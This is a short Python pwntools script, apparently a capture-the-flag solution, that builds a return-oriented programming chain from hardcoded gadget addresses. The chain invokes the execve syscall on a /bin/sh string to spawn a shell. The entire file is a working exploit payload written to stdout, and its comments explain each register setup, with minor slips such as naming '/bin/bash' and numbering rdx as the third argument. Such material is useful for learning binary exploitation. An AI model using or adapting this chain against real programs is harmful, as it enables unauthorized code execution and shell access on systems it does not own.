from pwn import *
import sys

# Gadgets
pop_rax = 0x400187
pop_rdi = 0x400189
pop_rsi = 0x40018b
pop_rdx = 0x40018d
syscall = 0x400184

# /bin/sh
binsh = 0x40018f

# Payload
payload = ""
payload += "AAAAAAAA"

# ROP CHAIN
# pop rax = free 1st ARG, syscall "execve" number "\x3b"
# 0x3b
# pop rdi = free 2nd ARG, const char *filename
# binsh address
# pop rsi = free 3rd ARG, const char *const argv[], 
# 0x00 NULL BYTE
# pop rdx = free 3rd ARG, const char *const envp[], 
# 0x00 NULL BYTE
# execve("/bin/bash", NULL, NULL");
# Syscall

payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0x0)	
payload += p64(pop_rdx)
payload += p64(0x0)	
payload += p64(syscall) 

sys.stdout.write(payload)

